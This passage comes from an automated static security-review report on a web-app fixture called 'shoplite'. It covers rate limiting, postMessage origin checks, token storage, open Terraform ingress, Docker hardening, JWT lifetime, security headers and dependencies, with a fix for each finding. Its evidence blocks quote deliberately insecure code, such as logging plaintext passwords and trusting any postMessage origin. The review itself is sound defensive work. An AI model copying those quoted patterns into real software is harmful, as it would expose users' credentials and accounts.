**References:** CWE-367; OWASP Race Conditions Cheat Sheet.

### [SR-022] [MEDIUM] [No rate limiting and account enumeration on login]

**Location:** `src/auth.js:43-47` (endpoint mounted at `src/server.js:19`)
**Category:** CWE-307 (Unrestricted Rate Limiting) / CWE-204 (Observable Response Discrepancy)
**Confidence:** Confirmed
**Exploitability:** Direct

**Description:**
`POST /api/login` has no rate limiting, lockout, or CAPTCHA — and none exists anywhere in the codebase — so password brute force is unconstrained. The responses also differ: `401 "User not found"` vs `401 "Wrong password"`, letting attackers enumerate registered emails before attacking passwords (the plaintext-password logging at SR-020 then archives every guess). With SR-011's fast hashes, offline cracking is trivial once the DB leaks, and online brute force is free.

**Evidence:**
```
auth.js:43:   if (!rows[0]) return res.status(401).json({ error: 'User not found' });
auth.js:44:   const match = hashPassword(password) === rows[0].password_hash;
auth.js:45:   if (!match) {
auth.js:46:     console.log('failed login', { email, password });
auth.js:47:     return res.status(401).json({ error: 'Wrong password' });
```

**Remediation:**
- Return a single generic message for both cases: `Invalid credentials`.
- Add rate limiting (`express-rate-limit` keyed by IP+email) with progressive lockout on the login, reset, and MFA endpoints; consider a distributed store (Redis) for multi-instance deployments.

**References:** CWE-307, CWE-204; OWASP Authentication Cheat Sheet.

### [SR-023] [MEDIUM] [postMessage handler trusts any origin with session tokens]

**Location:** `public/app.js:19-24`
**Category:** CWE-345 (Insufficient Verification of Data Authenticity) — unvalidated postMessage origin
**Confidence:** Confirmed
**Exploitability:** Requires chaining

**Description:**
The `message` event handler acts on `event.data.type === 'auth-token'` without checking `event.origin` against an allowlist. Any window that can obtain a reference (opener, iframe embeds) can post a crafted message: the handler stores the attacker-supplied token into `localStorage` (session fixation — victim silently operates as the attacker's account, an "login CSRF" equivalent) and calls `loadProfile` with an attacker-chosen `userId` (also feeding SR-009's sinks).

**Evidence:**
```
app.js:18: // Handshake with the OAuth popup window
app.js:19: window.addEventListener('message', (event) => {
app.js:20:   if (event.data.type === 'auth-token') {
app.js:21:     localStorage.setItem('session_token', event.data.token);
app.js:22:     loadProfile(event.data.userId);
app.js:23:   }
app.js:24: });
```

**Remediation:**
```js
const ALLOWED = new Set(['https://auth.shoplite.example']);
window.addEventListener('message', (event) => {
  if (!ALLOWED.has(event.origin)) return;
  if (event.source !== popupRef) return;
  // ... handle event.data
});
```

**References:** CWE-345; OWASP DOM-Based XSS / postMessage guidance; MDN `MessageEvent.origin`.

### [SR-024] [MEDIUM] [Session token stored in localStorage]

**Location:** `public/app.js:2`
**Category:** CWE-522 / OWASP Session Management (token accessible to JavaScript)
**Confidence:** Confirmed
**Exploitability:** Requires chaining

**Description:**
The web client persists the session token in `localStorage`, readable by any JavaScript running on the page. This converts every XSS in the app (SR-008, SR-009, SR-010 — three live XSS paths) into outright token theft and account takeover. `localStorage` survives tab closure, so stolen tokens remain valid for the full 30-day JWT lifetime (SR-027).

**Evidence:**
```
app.js:2: const token = localStorage.getItem('session_token');
app.js:21:    localStorage.setItem('session_token', event.data.token);
```

**Remediation:**
Prefer an `HttpOnly` + `Secure` + `SameSite=Lax` cookie set by the server (the API already reads `req.cookies.session` in `/api/profile`), or keep the token in memory only for the page lifetime. Never place long-lived tokens in web storage.

**References:** OWASP Session Management Cheat Sheet; auth0 guidance on token storage.

### [SR-025] [MEDIUM] [Terraform security group exposes SSH and Postgres to the entire internet]

**Location:** `terraform/main.tf:9-21`
**Category:** CWE-668 (Resource with Insecure Exposed Interface)
**Confidence:** Confirmed
**Exploitability:** Direct

**Description:**
The `shoplite-app` security group allows ingress on port 22 (SSH) and — far worse — port 5432 (PostgreSQL) from `0.0.0.0/0`. A world-open database port fronting credentials already leaked in `.env`/compose (SR-004) and a weak reused password equals direct full-database compromise from anywhere. Compose compounds this by publishing the database (`"5432:5432"`, all host interfaces — SR-026). SSH-for-all additionally invites brute force against any keys/passwords on the host.

**Evidence:**
```
main.tf:9:   ingress {
main.tf:10:    from_port   = 22
main.tf:13:    cidr_blocks = ["0.0.0.0/0"]
main.tf:16:  ingress {
main.tf:17:    from_port   = 5432
main.tf:20:    cidr_blocks = ["0.0.0.0/0"]
```

**Remediation:**
Remove the 5432 ingress entirely (the app reaches the DB over a private subnet/VPC or compose network — the compose service name `db` already resolves internally). Restrict SSH to a bastion/VPN CIDR or remove it in favor of SSM Session Manager. Add `description`s per rule and enforce tagging/Policy-as-Code (e.g. `tfsec`/`checkov` in CI) to catch open ingress.

**References:** CWE-668; AWS security-group best practices; tfsec AWS007/AWS008-class checks.

### [SR-026] [MEDIUM] [Container runs as root; secrets and whole repo baked into image; DB port published]

**Location:** `Dockerfile:1-6`, `docker-compose.yml:4-14`
**Category:** CWE-250 (Execution with Unnecessary Privileges) / CWE-798
**Confidence:** Confirmed
**Exploitability:** Requires chaining

**Description:**
The Dockerfile has no `USER` directive (runs as root), `COPY . .` copies the entire build context — including the committed `.env` (SR-004), `terraform/`, and source — into the image, and `npm install` runs unpinned with no lockfile (SR-029). Because SR-001 (RCE) and SR-012 (arbitrary file read) exist in this app, root-in-container plus a baked-in `/app/.env` directly upgrades those findings to host-level concerns and secret disclosure from any image copy. Compose publishes Postgres on `0.0.0.0:5432` with an inline password, exposing the DB beyond the compose network.

**Evidence:**
```
Dockerfile:1: FROM node:20
Dockerfile:2: WORKDIR /app
Dockerfile:3: COPY . .
Dockerfile:4: RUN npm install
docker-compose.yml:4:    ports:
docker-compose.yml:5:      - "3000:3000"
docker-compose.yml:13:    ports:
docker-compose.yml:14:      - "5432:5432"
```

**Remediation:**
```dockerfile
FROM node:20 AS deps
WORKDIR /app
COPY package*.json ./
RUN npm ci --omit=dev          # requires a committed lockfile
FROM node:20-slim
WORKDIR /app
COPY --from=deps /app/node_modules ./node_modules
COPY src public ./
USER node                      # non-root runtime
CMD ["node", "src/server.js"]
```
Add a `.dockerignore` (`.env`, `.git`, `terraform/`, `security-reviews/`), provide secrets at runtime (compose `secrets`/env_file not committed), and bind the DB port to loopback only (`127.0.0.1:5432:5432`) or drop the mapping entirely.

**References:** CWE-250; OWASP Docker Security Cheat Sheet; Dockerfile best practices.

### [SR-027] [LOW] [30-day JWT lifetime with no revocation or algorithm pinning]

**Location:** `src/auth.js:13,16-18`
**Category:** CWE-613 (Insufficient Session Expiration)
**Confidence:** Confirmed
**Exploitability:** Requires chaining

**Description:**
Tokens are issued with `expiresIn: '30d'` and there is no logout/revocation mechanism (stateless JWTs verified only against a static secret — which is also hardcoded, SR-004). A stolen token (via any of the XSS paths or the non-HttpOnly cookie) remains valid for up to a month, and password compromise cannot be contained without rotating the global secret. `jwt.verify` is also called without an explicit `algorithms` allowlist.

**Evidence:**
```
auth.js:13:  return jwt.sign({ sub: user.id, role: user.role }, JWT_SECRET, { expiresIn: '30d' });
auth.js:16: export function verifyToken(token) {
auth.js:17:   return jwt.verify(token, JWT_SECRET);
```

**Remediation:**
- Pin algorithms explicitly (`jwt.verify(token, key, { algorithms: ['HS256'] })`).
- Use short access-token lifetimes (5–15 min) with a refresh-token rotation/revocation store; invalidate sessions on password change.
- Load the secret from configuration/environment so it can rotate (per-env, not global).

**References:** CWE-613; `jsonwebtoken` README (algorithm pinning); OWASP Session Management Cheat Sheet.

### [SR-028] [LOW] [No security headers (CSP, HSTS, X-Content-Type-Options, X-Frame-Options)]

**Location:** `src/server.js` (application-wide; headers set nowhere)
**Category:** CWE-693 (Protection Mechanism Failure)
**Confidence:** Confirmed
**Exploitability:** Requires chaining

**Description:**
No middleware or route sets any security headers. The app serves user-influenced HTML (SR-008, SR-009, SR-010), uploads with attacker-influenced content type, and JSON APIs; absent `Content-Security-Policy`, `X-Content-Type-Options: nosniff`, `Strict-Transport-Security`, and `X-Frame-Options`/`frame-ancestors` removes layers that would otherwise blunt the XSS findings and enable clickjacking/framing of authenticated pages.

**Evidence:**
```
server.js:13: const app = express();
server.js:15: app.use(cors({ origin: '*', credentials: true }));
server.js:16: app.use(express.json({ limit: '50mb' }));
server.js:17: app.use(cookieParser());
```
(No `helmet`, no manual header middleware anywhere in `src/`.)

**Remediation:**
```js
import helmet from 'helmet';
app.use(helmet()); // CSP, nosniff, HSTS, frameguard, referrer-policy defaults
// Optionally tighten CSP further for the app's actual needs (script-src 'self', no unsafe-inline)
```

**References:** CWE-693; OWASP Secure Headers Project; MDN CSP.

### [SR-029] [LOW] [Dependency hygiene: no lockfile; abandoned/major-behind security packages]

**Location:** `package.json:9-22`, `Dockerfile:4`
**Category:** CWE-1104 (Use of Unmaintained Third Party Components) / supply-chain risk
**Confidence:** Confirmed
**Exploitability:** Theoretical

**Description:**
Per the skill's dependency rules, these are hygiene findings, not CVE claims. (1) No lockfile exists while `package.json` uses caret ranges and the Dockerfile runs bare `npm install` — non-reproducible builds, drift between environments, and silent supply-chain drift. (2) `node-serialize@0.0.4` is abandoned and inherently dangerous (SR-015). (3) `jsonwebtoken ^8.5.1` is a security-critical auth library multiple majors behind (v9 shipped security hardening; verify with a scanner rather than trusting this note). (4) `moment@2.29.4` is legacy/maintenance-mode. (5) `multer 1.4.5-lts.x` line predates the current 2.x line.

**Evidence:**
```
package.json:15:     "jsonwebtoken": "^8.5.1",
package.json:16:     "moment": "^2.29.4",
package.json:17:     "multer": "^1.4.5-lts.1",
package.json:18:     "node-serialize": "0.0.4",
Dockerfile:4: RUN npm install
```

**Remediation:**
Commit `package-lock.json` and use `npm ci` in the Dockerfile; remove `node-serialize`; upgrade `jsonwebtoken` (v9+), `multer` (2.x), and replace `moment` with `date-fns`/`dayjs` or native `Intl`. Adopt `osv-scanner`/`npm audit` in CI plus Dependabot/Renovate for continuous updates — exact known-vulnerability status must come from those tools, which were not run per the rules of engagement.

**References:** CWE-1104; OWASP A06:2021 Vulnerable and Outdated Components; osv-scanner documentation.

## Informational Notes

- **[SR-030] `DEBUG=true` in committed environment** (`.env:6`). No debug-mode code path was found in the reviewed sources, but the flag signals a verbose-diagnostics deployment posture alongside SR-019; keep production `.env` free of debug flags and make verbose modes env-gated and off by default.
- **[SR-031] 50 MB JSON body limit** (`src/server.js:16`). `express.json({ limit: '50mb' })` invites memory/CPU exhaustion (request-body DoS) on every JSON route, unauthenticated. Reduce to the smallest workable limit (e.g. 100 KB for these payloads) and let the upload endpoint's `multipart` limits (SR-008) handle large bodies separately.
- GraphQL lacks depth/complexity limits — noted within SR-003 rather than separately, since the endpoint's missing authentication dominates.
- Prompt-injection hygiene note: code comments in this fixture (e.g. "Diagnostics page for support", "Legacy session format kept for the v1 mobile app") were treated as untrusted context per the rules of engagement; none contained instructions directed at the reviewer.

## Positive Observations

- **Parameterized queries in the happy paths**: `db.js` search (`ILIKE $1`), login lookup, order inserts, coupon lookups, and the AI email fetch all use bound parameters — the core SQL-injection hygiene pattern is understood by the authors, which makes the three interpolation escapes (SR-002, SR-005) clearly fixable regressions.
- **`requireAuth` middleware exists and is applied** to `/api/me/orders`, `/api/preview`, `/api/me`, uploads, payments, and the AI route — the auth scaffolding is in place and consistently enforced on most new endpoints.
- **`/api/me/orders` is correctly owner-scoped** (`user_id = req.user.sub` with a parameterized query) — the right IDOR-free pattern, just not applied to `/api/users/:id/orders`.
- **JWT expiry is configured** (albeit too long, SR-027) and login responses use a distinct failure path with try/catch around verification rather than crashing.
- **`renderUserName` uses `document.createElement` + `textContent`** (`public/app.js:26-30`) — the safe DOM API pattern is present in the same file as the unsafe sinks.
- **The AI inbox query is tenant-scoped** (`WHERE user_id = req.user.sub`) — retrieval respects user boundaries; the weakness is in tool scope, not data access.

## Recommendations Summary

**Immediate (this week — each is directly exploitable today):**
1. Remove or gate `GET /api/ping` (SR-001, RCE) — one-line change with maximum risk reduction.
2. Allowlist the `sort` column and add auth to `/api/admin/users` (SR-002); allowlist updatable fields in `PUT /api/me` (SR-005).
3. Put `requireAuth` + per-resolver ownership on `/graphql`; disable GraphiQL (SR-003).
4. Rotate all exposed secrets, purge `.env` from git history, add `.gitignore`/`.dockerignore` (SR-004, SR-026).

**Short-term (this sprint):**
5. Fix authorization on `/api/users/:id/orders` (SR-006); scope/redirect-harden `/api/preview` (SR-007); contain the download path (SR-012).
6. Encode output in `/welcome`, replace `innerHTML` with `textContent`, allowlist upload types and serve uploads off-origin/with `nosniff` (SR-008/009/010).
7. Migrate passwords to Argon2id/bcrypt with rehash-on-login (SR-011); add rate limiting + generic login errors (SR-022).
8. Cookie hardening (`HttpOnly, Secure, SameSite=Lax`) + CSRF middleware (SR-018); fix CORS allowlist (SR-017); opaque error handler (SR-019); stop logging passwords (SR-020).
9. Server-side totals in a transaction; atomic coupon redemption (SR-013, SR-021).
10. Restrict the AI assistant to read-only-by-default with human confirmation for `send_email` and an allowlisted `fetch_page` (SR-014).

**Longer-term hardening:**
11. Restructure IaC/containers: non-root minimal images, `.dockerignore`, lockfile + `npm ci`, remove world-open SSH/Postgres rules, move secrets to a manager (SR-025, SR-026, SR-029).
12. Introduce `helmet`-style security headers and a tuned CSP (SR-028); move tokens out of `localStorage` (SR-024); validate `postMessage` origins (SR-023).
13. Adopt short-lived tokens with rotation/revocation (SR-027) and delete the dead `parseLegacySession`/`Math.random` reset helpers before they get wired up (SR-015, SR-016).
14. Stand up continuous scanning: `gitleaks`/`trufflehog` for secrets, `osv-scanner`/`npm audit` + Dependabot for dependencies, and `tfsec`/`checkov` for the Terraform — none of which were run in this static-only review.

---

*Report generated by the `security-review` skill v2.0.0 (2026-10-08). Static analysis only; no code executed, no tools installed, no network requests made. Triage backlog (`security-reviews/backlog.md`) intentionally not updated in this run — the invoking session restricted writes to the two report files.*
